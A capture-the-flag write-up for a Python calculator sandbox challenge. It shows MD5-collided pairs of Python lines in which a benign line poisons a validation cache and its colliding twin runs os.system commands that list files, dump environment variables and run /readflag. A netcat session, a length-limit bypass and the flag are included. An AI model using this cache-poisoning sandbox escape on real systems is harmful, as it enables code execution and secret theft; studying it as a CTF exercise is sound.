# PYCALC

Goal: Generate MD5 hash collisions to end up with two valid Python commands where one passes the sandbox and the other runs our payload.

[Hashclash textcoll](https://github.com/cr-marcstevens/hashclash/blob/master/scripts/textcoll.sh) config:
```bash
ALPHABET='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\()*+,-./:;<=>?@[\]^_`{|}~'"'"

FIRSTBLOCKBYTES="TODO add this to the writeup lol"
SECONDBLOCKBYTES=""
```

Just tried looking for the flag in PWD, got nothing:

```py
AA=eval;b='__import__("os").system("ls -al;cat *")';':3DDN:3DDN:[a?MB-QPR4RjL44z?d';A=(b)#|:^Iptz6d1-yvLWkykX6kCA?Suvf)Bu<KH_Me#6F}Ebf9'>ZF7i=BKwk+}&B=4<v8OdqZ0Q@Dz,ZL]u0AS<i16ku*R########=709
AA=eval;b='__import__("os").system("ls -al;cat *")';':3DDN:3DDN:[a?MB-QPR4RjL44z?d';AA(b)#|:^Iptz6d1-yvLWkykX6kCA?Suvf)Bu<KH_Me#6F}Ebf9'>ZF7i=BKwk+}&B=4<v8OdqZ0Q@Dz,ZL]u0AS<i16ku*R########=709
```

```py
AA=eval;b='__import__("os").listdir()';':3DDNDDNDDN:3DDNDDNDDN:3`U_<H>I3M/f&EN^R,C';A=(b)#~L?crxC.lwX1^7-l'"&l5QiVeXW5.8s!s23t\:IpEO3P=]nNjEko+OeH~`?pzt!"a;cw/r%=\8uf?)GT}f3(}bzeu+!!!!"!!!/{F/
AA=eval;b='__import__("os").listdir()';':3DDNDDNDDN:3DDNDDNDDN:3`U_<H>I3M/f&EN^R,C';AA(b)#~L?crxC.lwX1^7-l'"&l5QiVeXW5.8s!s23t\:IpEO3P=]nNjEko+OeH~`?pzt!"a;cw/r%=\8uf?)GT}f3(}bzeu+!!!!"!!!/{F/
```

Looked at ENV as well as all folders in /:

```py
AA=eval;b='__import__("os").system("pwd;env;ls -al / /*")';'Duck2<;`KKJ6+!KDxC7399';A=(b)#wh=Ye9(5r:f!i7KD{AR!p[@:U`uv&Bw_1pO.:##X(d}>[BF)%oy;kKPb*na8;0NdQFilXE~\Mc+ZZcU]*Z)r5ptTU&!!)!9!!!6VdB
AA=eval;b='__import__("os").system("pwd;env;ls -al / /*")';'Duck2<;`KKJ6+!KDxC7399';AA(b)#wh=Ye9(5r:f!i7KD{AR!p[@:U`uv&Bw_1pO.:##X(d}>[BF)%oy;kKPb*na8;0NdQFilXE~\Mc+ZZcU]*Z)r5ptTU&!!)!9!!!6VdB

```

Found /readfile and ran it to get flag:


```py
AA=eval;b='__import__("os").system("/readflag")';'DuckDuckDuckNoeq/"Pb;f^lFz(*Z9Y9';A=(b)#z"JTOR1&6=SUblG$^~=z!\yB|O|s%22ROt;*GP7J`#TojG=?4T"e29$r#=lkpL@fLh5%5'Bq&kq"!!}L5Se3zYFv-n!!(!)9!!WM`}
AA=eval;b='__import__("os").system("/readflag")';'DuckDuckDuckNoeq/"Pb;f^lFz(*Z9Y9';AA(b)#z"JTOR1&6=SUblG$^~=z!\yB|O|s%22ROt;*GP7J`#TojG=?4T"e29$r#=lkpL@fLh5%5'Bq&kq"!!}L5Se3zYFv-n!!(!)9!!WM`}
```

Note: There was a 192 character limit. If you sent a payload exactly 192 characters long (such as our payload), the shell kicked you out, but you could do `payload;a` to bypass this.

```py
$ nc pycalc.2024.ctfcompetition.com 1337
== proof-of-work: disabled ==
Simple calculator in Python, type 'exit' to exit
> AA=eval;b='__import__("os").system("/readflag")';'DuckDuckDuckNoeq/"Pb;f^lFz(*Z9Y9';A=(b)#z"JTOR1&6=SUblG$^~=z!\yB|O|s%22ROt;*GP7J`#TojG=?4T"e29$r#=lkpL@fLh5%5'Bq&kq"!!}L5Se3zYFv-n!!(!)9!!WM`};a
AA=eval;b='__import__("os").system("/readflag")';'DuckDuckDuckNoeq/"Pb;f^lFz(*Z9Y9';A=(b)#z"JTOR1&6=SUblG$^~=z!\yB|O|s%22ROt;*GP7J`#TojG=?4T"e29$r#=lkpL@fLh5%5'Bq&kq"!!}L5Se3zYFv-n!!(!)9!!WM`};a
Caching code validation result with key eaf88ad5d7461edd57598b84f8d842ee
Waiting up to 10s for completion
'DuckDuckDuckNoeq/"Pb;f^lFz(*Z9Y9'
> invalid syntax (<stdin>, line 1)
> AA=eval;b='__import__("os").system("/readflag")';'DuckDuckDuckNoeq/"Pb;f^lFz(*Z9Y9';AA(b)#z"JTOR1&6=SUblG$^~=z!\yB|O|s%22ROt;*GP7J`#TojG=?4T"e29$r#=lkpL@fLh5%5'Bq&kq"!!}L5Se3zYFv-n!!(!)9!!WM`}
AA=eval;b='__import__("os").system("/readflag")';'DuckDuckDuckNoeq/"Pb;f^lFz(*Z9Y9';AA(b)#z"JTOR1&6=SUblG$^~=z!\yB|O|s%22ROt;*GP7J`#TojG=?4T"e29$r#=lkpL@fLh5%5'Bq&kq"!!}L5Se3zYFv-n!!(!)9!!WM`}
Hit code validation result cache with key eaf88ad5d7461edd57598b84f8d842ee
Waiting up to 10s for completion
'DuckDuckDuckNoeq/"Pb;f^lFz(*Z9Y9'
CTF{Ca$4_f0r_d3_C4cH3_Ha5hC1a5h}
0
>
```
